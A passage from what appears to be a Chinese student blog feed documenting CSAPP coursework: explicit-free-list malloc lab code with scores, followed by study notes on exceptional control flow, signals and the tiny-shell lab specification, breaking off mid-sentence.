operator">*</span>pre_block<span class="token punctuation">,</span><span class="token operator">*</span>post_block<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> prev_alloc<span class="token operator">=</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> next_alloc<span class="token operator">=</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">insert_freelist</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>prev_alloc <span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>next_alloc<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//后面的块是空闲块，则指针不变，合并后面的块</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>        post_block<span class="token operator">=</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">remove_freelist</span><span class="token punctuation">(</span>post_block<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">insert_freelist</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>next_alloc<span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> prev_alloc<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//前面的块空闲</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//  if(bp==next_fitp)</span>       <span class="token comment">// next_fitp=PREV_BLKP(bp);</span>        pre_block <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        post_block <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">remove_freelist</span><span class="token punctuation">(</span>pre_block<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">remove_freelist</span><span class="token punctuation">(</span>post_block<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">insert_freelist</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>oldptr<span class="token operator">=</span>ptr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>newptr<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> new_size<span class="token punctuation">,</span>old_size<span class="token punctuation">,</span>extend_size<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ptr<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    new_size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>size<span class="token operator">+</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    old_size<span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>old_size<span class="token operator">>=</span>new_size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//只需要在原有空间上释放后面的一部分空间就可以了，其实可以直接用place语句替换ifelse</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>old_size<span class="token operator">-</span>new_size<span class="token operator">>=</span>MINBLOCK<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">place</span><span class="token punctuation">(</span>oldptr<span class="token punctuation">,</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> oldptr<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> oldptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//太小了，只能释放内存，重新找一块新的</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newptr<span class="token operator">=</span><span class="token function">find_fit</span><span class="token punctuation">(</span>new_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        extend_size<span class="token operator">=</span><span class="token function">MAX</span><span class="token punctuation">(</span>new_size<span class="token punctuation">,</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newptr<span class="token operator">=</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>extend_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">place</span><span class="token punctuation">(</span>newptr<span class="token punctuation">,</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>newptr<span class="token punctuation">,</span>oldptr<span class="token punctuation">,</span>old_size<span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mm_free</span><span class="token punctuation">(</span>oldptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> newptr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>评分如下</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202407110613195.png" alt="image-20240711051622930"></p><h3 id="3-2优化地址维护freelist"><a href="#3-2优化地址维护freelist" class="headerlink" title="3.2优化地址维护freelist"></a>3.2优化地址维护freelist</h3><p>优化代码：</p><p>只需要改动insert-freelist，使得插进去时以地址排列从小到的的方式插进去，便于寻找</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">insert_freelist</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>pre_block<span class="token punctuation">,</span><span class="token operator">*</span>post_block<span class="token punctuation">,</span><span class="token operator">*</span>tmp<span class="token punctuation">;</span>    tmp<span class="token operator">=</span>head_free<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>post_block<span class="token operator">=</span><span class="token function">GETADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">)</span><span class="token punctuation">;</span>post_block<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>post_block<span class="token operator">=</span><span class="token function">GETADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>post_block<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>post_block<span class="token operator">></span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            pre_block<span class="token operator">=</span><span class="token function">GETADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>post_block<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span>pre_block<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span>post_block<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>pre_block<span class="token operator">==</span>head_free<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">PUTADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">,</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>pre_block<span class="token punctuation">)</span><span class="token punctuation">,</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>post_block<span class="token punctuation">)</span><span class="token punctuation">,</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        tmp<span class="token operator">=</span>post_block<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    pre_block<span class="token operator">=</span>tmp<span class="token punctuation">;</span>    <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span>pre_block<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>pre_block<span class="token operator">==</span>head_free<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">PUTADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">,</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>pre_block<span class="token punctuation">)</span><span class="token punctuation">,</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得分如下：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202407110613228.png" alt="image-20240711061019718"></p><h2 id="后期优化"><a href="#后期优化" class="headerlink" title="后期优化"></a>后期优化</h2><h3 id="分配块舍弃脚部，能获得更大的空间利用率"><a href="#分配块舍弃脚部，能获得更大的空间利用率" class="headerlink" title="分配块舍弃脚部，能获得更大的空间利用率"></a>分配块舍弃脚部，能获得更大的空间利用率</h3><h3 id="分离链表"><a href="#分离链表" class="headerlink" title="分离链表"></a>分离链表</h3><p>正如我们在前面所看到的，一个使用单向空闲块链表的分配器需要与空闲块数量呈线性关系的时间来分配块，为了近似达到最佳适配以及更快寻找适配块，可以根据不同的_大小类_来维护多个空闲链表。本代码采用的每个大小类都是2的幂。这样子就是log2级别的了,按理可以提速很多！</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_42241839/article/details/123697377">CSAPP(CMU 15-213)：Lab6 Malloclab详解_csapp malloc lab-CSDN博客</a></p><p><a href="https://www.cnblogs.com/hankeke303/p/18155103/csapp-malloclab">CSAPP Lab-7 Malloc Lab - hankeke303 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP的lab6-shlab</title>
      <link href="/2024/04/25/lab7/"/>
      <url>/2024/04/25/lab7/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>异常控制流(Exceptional Control Flow)</strong></p><p>网上的各种各样的辅助资料真的是太多太多太繁杂了，从学链接装载库的时候就感觉到了一点点，兴许也可能有我先看了一些书，然后又去看小土刀的解读，又去看别人的解读，又去看教授的讲解，很多不懂得还是不懂，懂得也开始变得不懂，而书本反倒没看，重心要进行调整，着重关注对书本的阅读，不去理会什么中文版英文版，那个看得懂就看哪一个，至于其他的资料，应该是要辅助书本的学习，书上不懂的再去查资料辅助学习，这样子才能系统学习。</p><p>4.26：这个课本是真的又长又臭，看了一天多才看了20多面，难死我脑袋了！</p><p>4.27:看完了一整章，做家庭作业的时候，前面的作业都很简单，部分的三星和所有的四星的比较困难，部分作业都看不懂题目，索性直接跳过，感觉难度曲线比较陡峭，这几天，五一前完成shlab。</p></blockquote><p>家庭作业：难点题目，8.20，8.22，8.24，8.25,<strong>8.26</strong>，<a href="https://dreamanddead.github.io/CSAPP-3e-Solutions/">作业答案</a></p><p>会在复盘知识框架的过程中添加自己不懂得&#x2F;认为重要的点，辅助深刻理解shlab的知识点。</p><h1 id="知识框架"><a href="#知识框架" class="headerlink" title="知识框架"></a>知识框架</h1><h2 id="8-1Exception"><a href="#8-1Exception" class="headerlink" title="8.1Exception"></a>8.1Exception</h2><p>Exception的分类</p><table><thead><tr><th>类别</th><th>原因</th><th>异步&#x2F;同步</th><th>返回行为</th></tr></thead><tbody><tr><td>interrupt（中断）</td><td>来自I&#x2F;O设备信号</td><td>异步</td><td>下一条</td></tr><tr><td>trap（陷阱）</td><td>有意的异常</td><td>同步</td><td>下一条</td></tr><tr><td>fault（故障）</td><td>潜在可恢复错误</td><td>同步</td><td>可能返回当前</td></tr><tr><td>abort（终止）</td><td>不可恢复</td><td>同步</td><td>不会返回</td></tr></tbody></table><p>异步异常:由处理器外部的I&#x2F;O设备中事件产生</p><p>中断处理（Interrupt）：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404261326743.png" alt="image-20240425132916409"></p><p>陷阱处理（Trap)：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404261358886.png" alt="image-20240425144208070"></p><p>故障处理（Fault）：<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404261358907.png" alt="image-20240425144245925"></p><p>所有的printf，exit（0),这些系统调用函数都可以使用syscall标准的调用进行实现</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404261358919.png" alt="image-20240425150737672"></p><h2 id="8-3系统调用错误处理"><a href="#8-3系统调用错误处理" class="headerlink" title="8.3系统调用错误处理"></a>8.3系统调用错误处理</h2><h2 id="8-4进程控制"><a href="#8-4进程控制" class="headerlink" title="8.4进程控制"></a>8.4进程控制</h2><h2 id="8-5信号"><a href="#8-5信号" class="headerlink" title="8.5信号"></a>8.5信号</h2><p>习题8.8</p><p>猜测输出：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">volatile long counter &#x3D; 2;void handler1(int sig)&#123;    sigset_t mask, prev_mask;    Sigfillset(&amp;mask);    Sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev_mask);  &#x2F;* Block sigs *&#x2F;    Sio_putl(--counter);    Sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL); &#x2F;* Restore sigs *&#x2F;    _exit(0);&#125;int main()&#123;    pid_t pid;    sigset_t mask, prev_mask;    printf(&quot;%ld&quot;, counter);    fflush(stdout);    signal(SIGUSR1, handler1);    if ((pid &#x3D; Fork()) &#x3D;&#x3D; 0) &#123;        while(1) &#123;&#125;;    &#125;    Kill(pid, SIGUSR1);    Waitpid(-1, NULL, 0);    Sigfillset(&amp;mask);    Sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev_mask);  &#x2F;* Block sigs *&#x2F;    printf(&quot;%ld&quot;, ++counter);    Sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL); &#x2F;* Restore sigs *&#x2F;    exit(0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并发错误避免</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;*WARNING :This code is buggy !*&#x2F;void handler(int sig) &#123;     int olderrno &#x3D; errno;     sigset_ t mask_all, prev _all;     pid_t pid;     Sigfillset(&amp;mask_all);&#x2F;&#x2F;添加所有信号     while ((pid &#x3D; waitpid(-1, NULL, 0)) &gt; 0) &#x2F;*Reap a zombie child *&#x2F;     &#123;         Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);         deletejob(pid);&#x2F;*Delete the child from the job list *&#x2F;         Sigprocmask(SIG_SETMASK, &amp;prev _all, NULL);    &#125;     if (errno !&#x3D; ECHILD) Sio_error(&quot;waitpid error&quot;);     errno &#x3D; olderrno;    &#125;int main(int argc, char **argv) &#123;    int pid;    sigset_t mask_all, prev_all;    Sigfillset(&amp;mask_all);    Signal(SIGCHLD, handler);    initjobs();&#x2F;*Initialize the job list *&#x2F;     while (1)    &#123;        if ((pid &#x3D; Fork()) &#x3D;&#x3D; 0) &#x2F;*Child process*&#x2F;        &#123;            Execve(&quot;&#x2F;bin&#x2F;date&quot;, argv, NULL);        &#125;         Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);&#x2F;*Parent process *&#x2F;         addjob(pid);&#x2F;*Add the child to the job list *&#x2F;         Sigprocmask(SIG_SETMASK, &amp;prev _all, NULL);            &#125;     exit(0);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在子进程中，程序执行 <code>Execve(&quot;/bin/date&quot;, argv, NULL);</code> 来替换当前进程的映像为 <code>/bin/date</code>，并执行 <code>date</code> 命令。如果 <code>Execve</code> 成功，子进程将不会返回执行 <code>while (1)</code> 循环，因为它已经被 <code>date</code> 命令替换了。</p><p>在父进程中，<code>Fork()</code> 返回子进程的PID，随后父进程会阻塞所有信号（通过 <code>Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</code>），将子进程PID添加到作业列表（通过调用 <code>addjob(pid);</code>），然后恢复之前的信号掩码（通过 <code>Sigprocmask(SIG_SETMASK, &amp;prev_all, NULL);</code>）。</p><h2 id="8-6-nonlocal-jump"><a href="#8-6-nonlocal-jump" class="headerlink" title="8.6 nonlocal jump"></a>8.6 nonlocal jump</h2><p>setjmp:调用一次，返回多次。</p><p>longjmp：调用一次，从不返回。（execve也是调用一次，从不返回，习题8.10）</p><p>能够从深层的函数嵌套中返回，不用一层一层的解开调用栈，所以他不是很安全，有点像goto类型语句</p><h2 id="8-7-Some-Tools"><a href="#8-7-Some-Tools" class="headerlink" title="8.7 Some Tools"></a>8.7 Some Tools</h2><p>STRACE: 打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。对于好奇的学生而言，这是一个令人着迷的工具。用 -static 编译你的程序，能得到一个更干净的、不带有大量与共享库相关的输出的轨迹。<br>PS: 列出当前系统中的进程（包括僵死进程）。<br>TOP: 打印出关千当前进程资源使用的信息。<br>PMAP: 显示进程的内存映射。</p><h1 id="辅助资料"><a href="#辅助资料" class="headerlink" title="辅助资料"></a>辅助资料</h1><p><a href="https://www.bilibili.com/video/BV1iW411d7hd">Lecture 14 Exceptional Control Flow Exceptions and Processes</a></p><p><a href="https://www.bilibili.com/video/BV1iW411d7hd">Lecture 15 Exceptional Control Flow Signals and Nonlocal Jumps</a></p><p><a href="https://wdxtub.com/csapp/thin-csapp-5/2016/04/16/">【读薄 CSAPP】伍 异常控制流</a></p><p><a href="https://fengmuzi2003.gitbook.io/csapp3e/di-08-zhang-yi-chang-kong-zhi-liu">第08章：异常控制流 | CSAPP重点解读 (gitbook.io)</a></p><p><a href="http://csapp.cs.cmu.edu/3e/shlab.pdf">shlab.dvi (cmu.edu)</a></p><h1 id="Lab前瞻"><a href="#Lab前瞻" class="headerlink" title="Lab前瞻"></a>Lab前瞻</h1><h2 id="Topic"><a href="#Topic" class="headerlink" title="Topic"></a>Topic</h2><blockquote><p>• eval: Main routine that parses and interprets the command line. [70 lines]</p><p>• builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]</p><p>• do bgfg: Implements the bg and fg built-in commands. [50 lines]</p><p>• waitfg: Waits for a foreground job to complete. [20 lines]</p><p>• sigchld handler: Catches SIGCHILD signals. 80 lines]</p><p>• sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]</p><p>• sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</p></blockquote><p>补全上面的函数，括号中的lines表示预计lines，补全完后make就行</p><h2 id="The-tsh-Speciﬁcation"><a href="#The-tsh-Speciﬁcation" class="headerlink" title="The tsh Speciﬁcation"></a>The tsh Speciﬁcation</h2><blockquote><p>Your tsh shell should have the following features:</p><p>• The prompt should be the string “tsh&gt; ”.</p><p>• The command line typed by the user should consist of a name and zero or more arguments, all separated by one or more spaces. If name is a built-in command, then tsh should handle it immediately and wait for the next command line. Otherwise, tsh should assume that name is the path of an executable ﬁle, which it loads and runs in the context of an initial child process (In this context, the term job refers to this initial child process).</p><p>• tsh need not support pipes (|) or I&#x2F;O redirection (&lt; and &gt;).</p><p>• Typing ctrl-c (ctrl-z) should cause a SIGINT (SIGTSTP) signal to be sent to the current foreground job, as well as any descendents of that job (e.g., any child processes that it forked). If there is no foreground job, then the signal should have no effect.</p><p>• If the command line ends with an ampersand &amp;, then tsh should run the job in the background.</p><p>Otherwise, it should run the job in the foreground.</p><p>• Each job can be identiﬁed by either a process ID (PID) or a job ID (JID), which is a positive integer assigned by tsh. JIDs should be denoted on the command line by the preﬁx ’%’. For example, “%5” denotes JID 5, and “5” denotes PID 5. (We have provided you with all of the routines you need for manipulating the job list.)</p><p>• tsh should support the following built-in commands:</p><p>– The quit command terminates the 